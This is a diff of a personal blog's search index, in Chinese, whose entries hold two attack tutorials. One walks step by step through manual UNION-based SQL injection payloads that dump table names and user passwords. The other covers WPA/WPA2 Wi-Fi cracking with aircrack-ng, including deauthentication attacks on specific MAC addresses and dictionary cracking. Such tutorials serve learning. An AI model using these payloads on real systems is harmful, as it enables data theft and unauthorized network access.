@@ -49,7 +49,7 @@
   <entry>
     <title><![CDATA[sql手注步骤（非盲注）]]></title>
     <url>%2F2018%2F05%2F05%2Fsql%E6%89%8B%E6%B3%A8%E6%AD%A5%E9%AA%A4%2F</url>
-    <content type="text"><![CDATA[手注步骤目录1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 1.判断是否存在注入，注入是字符型还是数字型判断注入类型：数字型，字符型 2.猜解SQL查询语句中的字段数判断字段数： 1′ or 1=1 order by 1,2,3,4,5 # 数字累加，直到不出结果或者报错。 注释常常使用--+或者#或者%23 或者用： -1′ union select 1,2 # 两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来 顺路进行下一步 3.确定显示的字段顺序-1′ union select 1,2 # 4.获取当前数据库-1′ union select 1,database() # 5.获取数据库中的表-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 从information_schema中查找表名 进行联合查询时要将查询用的语句放在最后一项 6.获取表中的字段名-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ # 爆users表内的表名 7.下载数据-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 从users里面取出所有用户的user_id,first_name,last_name,password的数据]]></content>
+    <content type="text"><![CDATA[手注步骤 目录1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 1.判断是否存在注入，注入是字符型还是数字型判断注入类型：数字型，字符型 2.猜解SQL查询语句中的字段数判断字段数： 1′ or 1=1 order by 1,2,3,4,5 # 数字累加，直到不出结果或者报错。 注释常常使用--+或者#或者%23 或者用： -1′ union select 1,2 # 两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来 顺路进行下一步 3.确定显示的字段顺序-1′ union select 1,2 # 4.获取当前数据库-1′ union select 1,database() # 5.获取数据库中的表-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 从information_schema中查找表名 进行联合查询时要将查询用的语句放在最后一项 6.获取表中的字段名-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ # 爆users表内的表名 7.下载数据-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 从users里面取出所有用户的user_id,first_name,last_name,password的数据]]></content>
       <categories>
         <category>sql</category>
       </categories>
@@ -60,7 +60,7 @@
   <entry>
     <title><![CDATA[利用kali破解wpa/wpa2加密的WIFI（爆破美学）]]></title>
     <url>%2F2018%2F05%2F01%2F%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wpa-wpa2%E5%8A%A0%E5%AF%86%E7%9A%84WIFI%EF%BC%88%E7%88%86%E7%A0%B4%E7%BE%8E%E5%AD%A6%EF%BC%89%2F</url>
-    <content type="text"><![CDATA[利用kali破解wpa/wpa2加密的WIFI（爆破美学）硬件准备阶段：因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是RT3070L芯片组的网卡，某宝上面无壳的只要20元，加壳才25元。在kali中必须识别出网卡，使用ifconfig查看网卡信息，wlan0为无线网卡。 攻击准备阶段：开启网卡监听模式：airmon-ng start wlan0 如果成功的话，网卡名称会变成wlan0mon 扫描热点：airodump-ng wlan0mon 可以看到如图信息[ 抓握手包：c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。 airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root -c 选择信道，对应上图CH --bssid 需要破解的wifi的mac地址 -w cap文件名及路径 wlan0mon 启用监听模式的网卡名 当有人连接时就能抓到握手包。 如果对面都在使用wifi，没人连接怎么办？通过以下命令断开设备与WiFi的连接 aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon -0 death（强制下线模式），20为执行次数 -c 被断网的客户机MAC -a WIFI热点的mac 抓包成功后白圈出现信息。 爆破：kali：利用aircrack-ng命令 aircrack-ng -w 字典 握手包 cpu跑这个破解速度有些慢。 windows：神器1：EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人) 神器2：oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。有国人开发了中文版的UI，减少了使用成本，链接：HashcatGUI_cn – HashcatGUI 中文版]]></content>
+    <content type="text"><![CDATA[利用kali破解wpa/wpa2加密的WIFI（爆破美学）硬件准备阶段：因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是RT3070L芯片组的网卡，某宝上面无壳的只要20元，加壳才25元。 在kali中必须识别出网卡，使用ifconfig查看网卡信息，wlan0为无线网卡。 攻击准备阶段：开启网卡监听模式：airmon-ng start wlan0 如果成功的话，网卡名称会变成wlan0mon 扫描热点：airodump-ng wlan0mon 可以看到如图信息[ 抓握手包：c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。 airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root -c 选择信道，对应上图CH --bssid 需要破解的wifi的mac地址 -w cap文件名及路径 wlan0mon 启用监听模式的网卡名 当有人连接时就能抓到握手包。 如果对面都在使用wifi，没人连接怎么办？通过以下命令断开设备与WiFi的连接 aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon -0 death（强制下线模式），20为执行次数 -c 被断网的客户机MAC -a WIFI热点的mac 抓包成功后白圈出现信息。 爆破：kali：利用aircrack-ng命令 aircrack-ng -w 字典 握手包 cpu跑这个破解速度有些慢。 windows：神器1：EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人) 神器2：oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。有国人开发了中文版的UI，减少了使用成本，链接：HashcatGUI_cn – HashcatGUI 中文版]]></content>
       <categories>
         <category>kali</category>
       </categories>
@@ -111,7 +111,7 @@
   <entry>
     <title><![CDATA[搭建个人博客]]></title>
     <url>%2F2018%2F01%2F16%2F%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F</url>
-    <content type="text"><![CDATA[第一次尝试2018/1/16经过两天的尝试，终于成功地在Github上面搭建了博客。]]></content>
+    <content type="text"><![CDATA[第一次尝试 2018/1/16经过两天的尝试，终于成功地在Github上面搭建了博客。]]></content>
   </entry>
   <entry>
     <title><![CDATA[Hello World]]></title>
